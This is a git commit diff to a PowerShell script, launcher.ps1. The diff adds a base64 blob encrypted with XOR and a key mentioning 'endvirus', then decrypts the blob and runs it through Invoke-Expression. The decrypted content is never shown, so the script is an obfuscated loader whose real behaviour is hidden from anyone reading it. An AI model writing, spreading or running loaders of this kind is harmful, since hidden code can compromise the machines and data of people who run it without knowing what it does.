d5cc1ec7077fb16bb76bf2a70ab61603feeed78f
UmbrellaShow1 <hokemon999@gmail.com>
2026-07-03 18:57:16 +0500

    Update launcher.ps1

--- launcher.ps1
+++ launcher.ps1
@@ -1,20 +1,15 @@
 function Decrypt-String {
-    param (
-        [string]$EncryptedString,
-        [string]$Key
-    )
+    param ([string]$EncryptedString, [string]$Key)
     $encryptedBytes = [Convert]::FromBase64String($EncryptedString)
     $decryptedChars = @()
     for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
-
         $decryptedChars += [char]($encryptedBytes[$i] -bxor [byte][char]$Key[$i % $Key.Length])
     }
     return -join $decryptedChars
 }
 
-$encryptedScript = "[ShVSWFMvIxosBwAMXConcSATGwoxX1ctCh8HGhoVS3sWCxdINy0SIF5PRQkLCRgMABAAWhUbOlRMWlIqBikfGQpPPgAeGigXERsbFENyJhcIUkQAKwQCHFhDSh8PElwCGgAYFj0GFgQAAAcxBBcBFkIGAgNKJwgRBhUPMxI2CR0UWXA+Fx0HHxE9LUoAABUHXws6EgESXQ4JNh5dCgwIEwQcEAFLFgwVRH9eKhQGJQEzFVJLEldFPhoEABFeJAIMPBYWElJHGA==]" 
-
-$key = "[nerestpc_search_problem]"
+$encryptedScript = "SQl/TlUrNgssBwAOXCw7cTsEDTc7VUgcCgMGHwcXXVc6X0QJdSg0D19VVwAcOwUMEQcWWjoTAF52XU87MRMBDxNEIBAAK3xXR0kCHX9eIAIMUngbERcCFk5wRBcYKEgIGysNGwYDGhcHEDBfRlZPGVc8HBhfMB89AQAPHgQnNwQSSHAoCgA6Fho0NUYAEBUsHlpWQAkKcB4UGQtdOh0BFRsXASxFAAE6QU9fEBAaIh8FF1VXLwoSYFUMCyteJQIKEToAFkNWFQ=="
+$key = "my_super_secret_key_for_endvirus_123!"
 
 $decryptedScript = Decrypt-String -EncryptedString $encryptedScript -Key $key
 Invoke-Expression $decryptedScript
